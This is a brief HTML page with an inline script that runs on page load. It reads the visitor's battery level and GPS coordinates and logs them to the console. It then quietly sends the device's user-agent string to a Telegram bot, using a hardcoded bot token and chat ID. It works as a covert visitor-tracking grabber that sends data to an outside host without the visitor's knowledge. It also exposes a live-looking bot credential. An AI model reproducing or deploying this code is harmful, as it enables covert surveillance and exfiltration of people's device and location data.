<!DOCTYPE html>
<html>
<head>
    <title>Get Battery Level and Live Location</title>
</head>
<body>
    <script>
        // Code to get battery level
        navigator.getBattery().then(function(battery) {
            console.log("Battery Level: " + battery.level * 100 + "%");
        });

        // Code to get live location using GPS
        navigator.geolocation.getCurrentPosition(function(position) {
            console.log("Latitude: " + position.coords.latitude);
            console.log("Longitude: " + position.coords.longitude);
        });

        // Code to send mobile name to Telegram bot
        var botApiToken = "6438227169:AAEKg3lNj64EomHDUbseoWDE8ad91bjLvNc";
        var telegramId = "1776168152";
        var mobileName = navigator.userAgent;
        var url = "https://api.telegram.org/bot" + botApiToken + "/sendMessage?chat_id=" + telegramId + "&text=Mobile Name: " + mobileName;
        fetch(url);
    </script>
</body>
</html>
